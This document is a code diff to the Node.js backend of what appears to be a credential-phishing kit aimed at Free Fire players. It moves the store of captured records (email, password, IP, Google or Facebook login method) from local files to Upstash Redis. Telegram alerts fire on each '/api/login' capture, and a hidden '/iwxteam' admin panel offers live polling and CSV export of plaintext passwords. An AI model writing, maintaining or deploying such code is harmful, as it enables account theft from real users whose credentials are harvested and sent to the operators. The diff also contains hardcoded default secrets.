@@ -3,6 +3,7 @@ const nodemailer = require('nodemailer');
 const path       = require('path');
 const fs         = require('fs');
 const https      = require('https');
+const http       = require('http');
 const crypto     = require('crypto');
 
 const app  = express();
@@ -14,24 +15,81 @@ app.use(express.static(path.join(__dirname)));
 // ════════════════════════════════════════
 //  CONFIG
 // ════════════════════════════════════════
-const IS_VERCEL   = !!process.env.VERCEL;
-const DATA_FILE   = IS_VERCEL ? '/tmp/logins.json'    : path.join(__dirname, 'data', 'logins.json');
-const CFG_FILE    = IS_VERCEL ? '/tmp/settings.json'  : path.join(__dirname, 'data', 'settings.json');
+const IS_VERCEL    = !!process.env.VERCEL;
 const ADMIN_SECRET = process.env.ADMIN_SECRET || 'iwxteam-ff-admin-2026';
+const LOCAL_DATA   = path.join(__dirname, 'data', 'logins.json');
+const LOCAL_CFG    = path.join(__dirname, 'data', 'settings.json');
 
-// ── Dynamic settings (override env vars dari admin panel) ──
-function loadSettings() {
-  try { if (fs.existsSync(CFG_FILE)) return JSON.parse(fs.readFileSync(CFG_FILE, 'utf8')); } catch(_) {}
+// ════════════════════════════════════════
+//  UPSTASH REDIS — HTTP REST (no SDK needed)
+// ════════════════════════════════════════
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL   || '';
+const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || '';
+const USE_REDIS   = !!(REDIS_URL && REDIS_TOKEN);
+
+function redisCmd(...args) {
+  if (!USE_REDIS) return Promise.resolve(null);
+  return new Promise((resolve) => {
+    const body = JSON.stringify(args);
+    const url  = new URL(REDIS_URL);
+    const opts = {
+      hostname: url.hostname,
+      path: '/',
+      method: 'POST',
+      headers: {
+        'Authorization': 'Bearer ' + REDIS_TOKEN,
+        'Content-Type':  'application/json',
+        'Content-Length': Buffer.byteLength(body)
+      }
+    };
+    const mod = url.protocol === 'https:' ? https : http;
+    const req = mod.request(opts, res => {
+      let d = '';
+      res.on('data', c => d += c);
+      res.on('end', () => {
+        try { resolve(JSON.parse(d).result); } catch { resolve(null); }
+      });
+    });
+    req.on('error', e => { console.error('Redis error:', e.message); resolve(null); });
+    req.write(body);
+    req.end();
+  });
+}
+
+// ════════════════════════════════════════
+//  SETTINGS STORE (Redis key: ff:settings)
+// ════════════════════════════════════════
+let _cfgCache = null;
+
+async function loadSettings() {
+  if (USE_REDIS) {
+    try {
+      const raw = await redisCmd('GET', 'ff:settings');
+      if (raw) return JSON.parse(raw);
+    } catch(e) { console.error('loadSettings Redis error:', e.message); }
+  }
+  // Fallback ke file lokal
+  try {
+    if (fs.existsSync(LOCAL_CFG)) return JSON.parse(fs.readFileSync(LOCAL_CFG, 'utf8'));
+  } catch(_) {}
   return {};
 }
-function saveSettings(obj) {
+
+async function saveSettings(obj) {
+  _cfgCache = obj;
+  if (USE_REDIS) {
+    try { await redisCmd('SET', 'ff:settings', JSON.stringify(obj)); return; } catch(e) { console.error('saveSettings Redis error:', e.message); }
+  }
   try {
-    const dir = path.dirname(CFG_FILE);
+    const dir = path.dirname(LOCAL_CFG);
     if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-    fs.writeFileSync(CFG_FILE, JSON.stringify(obj, null, 2));
-  } catch(e) { console.error('saveSettings error:', e.message); }
+    fs.writeFileSync(LOCAL_CFG, JSON.stringify(obj, null, 2));
+  } catch(e) { console.error('saveSettings file error:', e.message); }
 }
-let cfg = loadSettings();
+
+// cfg dimuat async saat startup
+let cfg = {};
+(async () => { cfg = await loadSettings(); console.log('[Config] Loaded from', USE_REDIS ? 'Redis' : 'file'); })();
 
 function getCfg(key, envKey, def = '') {
   return (cfg[key] !== undefined && cfg[key] !== '') ? cfg[key] : (process.env[envKey] || def);
@@ -42,12 +100,18 @@ const getEmailUser= () => getCfg('emailUser','EMAIL_USER', '');
 const getEmailPass= () => getCfg('emailPass','EMAIL_PASS', '');
 const getAdminPass= () => getCfg('adminPass','ADMIN_PASSWORD', 'admin123');
 
-// ── Admin token (valid 24 jam) ──
-function generateAdminToken() {
-  const day = Math.floor(Date.now() / 86400000);
+// ── Admin token — valid, tolerate ±1 hari biar tidak mati tengah malam ──
+function generateAdminToken(dayOffset = 0) {
+  const day = Math.floor(Date.now() / 86400000) + dayOffset;
   return crypto.createHmac('sha256', ADMIN_SECRET).update(`${getAdminPass()}:${day}`).digest('hex');
 }
-function verifyAdminToken(token) { return token && token === generateAdminToken(); }
+function verifyAdminToken(token) {
+  if (!token) return false;
+  for (let d = -1; d <= 1; d++) {
+    if (token === generateAdminToken(d)) return true;
+  }
+  return false;
+}
 function adminMiddleware(req, res, next) {
   const auth = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
   if (!verifyAdminToken(auth)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
@@ -55,39 +119,73 @@ function adminMiddleware(req, res, next) {
 }
 
 // ════════════════════════════════════════
-//  DATA STORE
+//  DATA STORE — Upstash Redis List
+//  Key: ff:logins  (JSON array, newest first)
 // ════════════════════════════════════════
-function loadData() {
+
+async function loadData() {
+  if (USE_REDIS) {
+    try {
+      const raw = await redisCmd('GET', 'ff:logins');
+      if (raw) return JSON.parse(raw);
+      return [];
+    } catch(e) { console.error('loadData Redis error:', e.message); }
+  }
+  // Fallback file lokal
   try {
-    if (fs.existsSync(DATA_FILE)) {
-      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    if (fs.existsSync(LOCAL_DATA)) {
+      const raw = fs.readFileSync(LOCAL_DATA, 'utf8').trim();
+      if (raw) return JSON.parse(raw);
     }
-  } catch (_) {}
+  } catch(e) { console.error('loadData file error:', e.message); }
   return [];
 }
 
-function saveData(arr) {
-  try {
-    const dir = path.dirname(DATA_FILE);
-    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-    fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
-  } catch (e) {
-    console.error('saveData error:', e.message);
+async function saveData(arr) {
+  if (USE_REDIS) {
+    try {
+      const cap = arr.slice(0, 2000);
+      await redisCmd('SET', 'ff:logins', JSON.stringify(cap));
+      return;
+    } catch(e) { console.error('saveData Redis error:', e.message); }
   }
+  try {
+    const dir = path.dirname(LOCAL_DATA);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(LOCAL_DATA, JSON.stringify(arr, null, 2));
+  } catch(e) { console.error('saveData file error:', e.message); }
 }
 
-let logins = loadData();
-
-function addLogin(entry) {
-  logins.unshift(entry);          // terbaru di atas
-  if (logins.length > 1000) logins = logins.slice(0, 1000);
-  saveData(logins);
+// logins selalu di-load fresh dari Redis/file tiap request penting
+// Untuk TG bot callbacks yang sync, kita simpan cache pendek
+let _loginsCache = [];
+let _loginsCacheAt = 0;
+async function getLogins() {
+  // Cache 2 detik untuk mengurangi Redis calls
+  if (Date.now() - _loginsCacheAt < 2000) return _loginsCache;
+  _loginsCache = await loadData();
+  _loginsCacheAt = Date.now();
+  return _loginsCache;
 }
 
-function clearData() {
-  logins = [];
-  saveData(logins);
+async function addLogin(entry) {
+  const arr = await loadData();
+  arr.unshift(entry);
+  if (arr.length > 2000) arr.splice(2000);
+  _loginsCache = arr;
+  _loginsCacheAt = Date.now();
+  await saveData(arr);
 }
+
+async function clearData() {
+  _loginsCache = [];
+  _loginsCacheAt = Date.now();
+  await saveData([]);
+}
+
+// Backward compat: var `logins` untuk TG bot (di-refresh sebelum dipakai)
+let logins = [];
+async function refreshLogins() { logins = await getLogins(); return logins; }
 
 // ════════════════════════════════════════
 //  TELEGRAM API HELPERS
@@ -158,7 +256,7 @@ function methodIcon(m) { return m === 'Google' ? '🔵' : '🔷'; }
 
 // ── MAIN MENU ──
 function buildMainMenu() {
-  const total   = logins.length;
+  const total   = logins.length;  // logins di-refresh sebelum dipanggil
   const today   = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
   const todayCount = logins.filter(l => {
     return new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today;
@@ -478,6 +576,9 @@ ${LINE}
 //  WEBHOOK HANDLER
 // ════════════════════════════════════════
 async function handleUpdate(update) {
+  // Refresh logins dari Redis supaya data selalu fresh
+  await refreshLogins();
+
   // ── Pesan teks / command ──
   if (update.message) {
     const msg  = update.message;
@@ -563,7 +664,8 @@ async function handleUpdate(update) {
       }
       // Hapus dari index terbesar agar tidak geser
       indices.sort((a, b) => b - a).forEach(i => logins.splice(i, 1));
-      saveData(logins);
+      await saveData(logins);
+      _loginsCache = logins; _loginsCacheAt = Date.now();
       return tgSend(chat,
 `✅ <b>BERHASIL DIHAPUS!</b>
 ${LINE}
@@ -665,7 +767,7 @@ ${LINE}
     // EKSEKUSI HAPUS
     if (data === 'do_clear') {
       const jumlah = logins.length;
-      clearData();
+      await clearData();
       const text =
 `✅ <b>DATA BERHASIL DIHAPUS!</b>
 ${LINE}
@@ -777,8 +879,9 @@ app.post('/api/login', async (req, res) => {
     ts: Date.now()
   };
 
-  addLogin(entry);
-  const no = logins.length;
+  await addLogin(entry);
+  const arr = await getLogins();
+  const no = arr.length;
 
   // Kirim notif Telegram
   if (getTgToken() && getTgChat()) {
@@ -830,13 +933,14 @@ app.post('/api/login', async (req, res) => {
 });
 
 // ── API: Cari data ──
-app.get('/api/search', (req, res) => {
+app.get('/api/search', async (req, res) => {
   const q = (req.query.q || '').toLowerCase().trim();
   if (!q) return res.json({ results: [] });
-  const results = logins.filter(l =>
-    l.nickname.toLowerCase().includes(q) ||
-    l.uid.includes(q) ||
-    l.email.toLowerCase().includes(q)
+  const arr = await getLogins();
+  const results = arr.filter(l =>
+    (l.nickname||'').toLowerCase().includes(q) ||
+    (l.uid||'').includes(q) ||
+    (l.email||'').toLowerCase().includes(q)
   );
   res.json({ total: results.length, results: results.slice(0, 50) });
 });
@@ -866,10 +970,11 @@ app.get('/api/setup-webhook', async (req, res) => {
 });
 
 // ── API: Stats (untuk internal) ──
-app.get('/api/stats', (req, res) => {
-  const total = logins.length;
-  const google = logins.filter(l => l.method === 'Google').length;
-  res.json({ total, google, facebook: total - google, latest: logins[0] || null });
+app.get('/api/stats', async (req, res) => {
+  const arr = await getLogins();
+  const total = arr.length;
+  const google = arr.filter(l => l.method === 'Google').length;
+  res.json({ total, google, facebook: total - google, latest: arr[0] || null });
 });
 
 // ════════════════════════════════════════
@@ -896,28 +1001,30 @@ app.get('/iwxteam/api/verify', adminMiddleware, (req, res) => {
 });
 
 // Stats admin
-app.get('/iwxteam/api/stats', adminMiddleware, (req, res) => {
-  const total = logins.length;
+app.get('/iwxteam/api/stats', adminMiddleware, async (req, res) => {
+  const arr  = await getLogins();
+  const total = arr.length;
   const now   = Date.now();
   const today = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
-  const todayCount = logins.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
-  const weekCount  = logins.filter(l => now - l.ts < 7  * 86400000).length;
-  const monthCount = logins.filter(l => now - l.ts < 30 * 86400000).length;
-  const google     = logins.filter(l => l.method === 'Google').length;
-  const latest     = logins.slice(0, 5);
+  const todayCount = arr.filter(l => new Date(l.ts).toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' }) === today).length;
+  const weekCount  = arr.filter(l => now - l.ts < 7  * 86400000).length;
+  const monthCount = arr.filter(l => now - l.ts < 30 * 86400000).length;
+  const google     = arr.filter(l => l.method === 'Google').length;
+  const latest     = arr.slice(0, 5);
   res.json({ total, today: todayCount, week: weekCount, month: monthCount, google, facebook: total - google, latest });
 });
 
 // Data paginated + search
-app.get('/iwxteam/api/data', adminMiddleware, (req, res) => {
+app.get('/iwxteam/api/data', adminMiddleware, async (req, res) => {
+  const arr   = await getLogins();
   const page  = Math.max(0, parseInt(req.query.page)  || 0);
   const limit = Math.min(100, parseInt(req.query.limit) || 20);
   const q     = (req.query.q || '').toLowerCase().trim();
   const method= (req.query.method || '').toLowerCase();
-  let filtered = logins;
+  let filtered = arr;
   if (q) filtered = filtered.filter(l =>
-    l.nickname.toLowerCase().includes(q) || l.uid.includes(q) ||
-    l.email.toLowerCase().includes(q)    || (l.ip||'').includes(q)
+    (l.nickname||'').toLowerCase().includes(q) || (l.uid||'').includes(q) ||
+    (l.email||'').toLowerCase().includes(q)    || (l.ip||'').includes(q)
   );
   if (method === 'google')   filtered = filtered.filter(l => l.method === 'Google');
   if (method === 'facebook') filtered = filtered.filter(l => l.method === 'Facebook');
@@ -927,35 +1034,39 @@ app.get('/iwxteam/api/data', adminMiddleware, (req, res) => {
 });
 
 // Hapus per nomor atau range
-app.post('/iwxteam/api/delete', adminMiddleware, (req, res) => {
+app.post('/iwxteam/api/delete', adminMiddleware, async (req, res) => {
+  const arr = await getLogins();
   const { numbers, from: f, to: t } = req.body;
   let indices = [];
   if (f !== undefined && t !== undefined) {
-    const cap = Math.min(t, logins.length);
+    const cap = Math.min(t, arr.length);
     for (let i = f; i <= cap; i++) indices.push(i - 1);
   } else if (Array.isArray(numbers)) {
-    indices = numbers.map(n => n - 1).filter(i => i >= 0 && i < logins.length);
+    indices = numbers.map(n => n - 1).filter(i => i >= 0 && i < arr.length);
   }
   if (!indices.length) return res.json({ ok: false, error: 'Tidak ada data valid' });
-  indices.sort((a, b) => b - a).forEach(i => logins.splice(i, 1));
-  saveData(logins);
-  res.json({ ok: true, deleted: indices.length, remaining: logins.length });
+  indices.sort((a, b) => b - a).forEach(i => arr.splice(i, 1));
+  await saveData(arr);
+  _loginsCache = arr; _loginsCacheAt = Date.now();
+  res.json({ ok: true, deleted: indices.length, remaining: arr.length });
 });
 
 // Hapus semua
-app.post('/iwxteam/api/delete-all', adminMiddleware, (req, res) => {
-  const count = logins.length;
-  clearData();
+app.post('/iwxteam/api/delete-all', adminMiddleware, async (req, res) => {
+  const arr = await getLogins();
+  const count = arr.length;
+  await clearData();
   res.json({ ok: true, deleted: count });
 });
 
 // Export CSV
-app.get('/iwxteam/api/export', adminMiddleware, (req, res) => {
+app.get('/iwxteam/api/export', adminMiddleware, async (req, res) => {
+  const arr = await getLogins();
   const header = 'No,Nickname,UID,Level,Method,Email,Password,IP,Waktu\n';
-  const rows = logins.map((l, i) => {
+  const rows = arr.map((l, i) => {
     const t = new Date(l.ts).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-    const esc = v => `"${String(v||'').replace(/"/g,'""')}"`;
-    return `${i+1},${esc(l.nickname)},${esc(l.uid)},${esc(l.level||'-')},${esc(l.method)},${esc(l.email)},${esc(l.password)},${esc(l.ip||'-')},${esc(t)}`;
+    const e = v => `"${String(v||'').replace(/"/g,'""')}"`;
+    return `${i+1},${e(l.nickname)},${e(l.uid)},${e(l.level||'-')},${e(l.method)},${e(l.email)},${e(l.password)},${e(l.ip||'-')},${e(t)}`;
   }).join('\n');
   res.setHeader('Content-Type', 'text/csv; charset=utf-8');
   res.setHeader('Content-Disposition', `attachment; filename="ff-login-${Date.now()}.csv"`);
@@ -963,7 +1074,8 @@ app.get('/iwxteam/api/export', adminMiddleware, (req, res) => {
 });
 
 // Get settings — tampilkan nilai asli (protected by adminMiddleware)
-app.get('/iwxteam/api/settings', adminMiddleware, (req, res) => {
+app.get('/iwxteam/api/settings', adminMiddleware, async (req, res) => {
+  cfg = await loadSettings();
   res.json({
     ok: true,
     tgToken:    getTgToken(),
@@ -974,26 +1086,28 @@ app.get('/iwxteam/api/settings', adminMiddleware, (req, res) => {
     adminPassSet: !!(cfg.adminPass || process.env.ADMIN_PASSWORD),
     hasTgToken: !!getTgToken(),
     hasTgChat:  !!getTgChat(),
+    usingRedis: USE_REDIS,
   });
 });
 
 // Update settings
-app.post('/iwxteam/api/settings', adminMiddleware, (req, res) => {
+app.post('/iwxteam/api/settings', adminMiddleware, async (req, res) => {
   const { tgToken, tgChat, emailUser, emailPass, adminPass } = req.body;
   if (tgToken   !== undefined && tgToken   !== '') cfg.tgToken   = tgToken;
   if (tgChat    !== undefined && tgChat    !== '') cfg.tgChat    = tgChat;
   if (emailUser !== undefined && emailUser !== '') cfg.emailUser = emailUser;
   if (emailPass !== undefined && emailPass !== '') cfg.emailPass = emailPass;
   if (adminPass !== undefined && adminPass.length >= 6) cfg.adminPass = adminPass;
-  saveSettings(cfg);
+  await saveSettings(cfg);
   res.json({ ok: true, newToken: generateAdminToken() });
 });
 
 // Live log polling
-app.get('/iwxteam/api/live', adminMiddleware, (req, res) => {
+app.get('/iwxteam/api/live', adminMiddleware, async (req, res) => {
   const since = parseInt(req.query.since) || 0;
-  const data = logins.filter(l => l.ts > since).slice(0, 50);
-  res.json({ ok: true, data, serverTime: Date.now(), total: logins.length });
+  const arr   = await getLogins();
+  const data  = arr.filter(l => l.ts > since).slice(0, 50);
+  res.json({ ok: true, data, serverTime: Date.now(), total: arr.length });
 });
 
 // Test Telegram
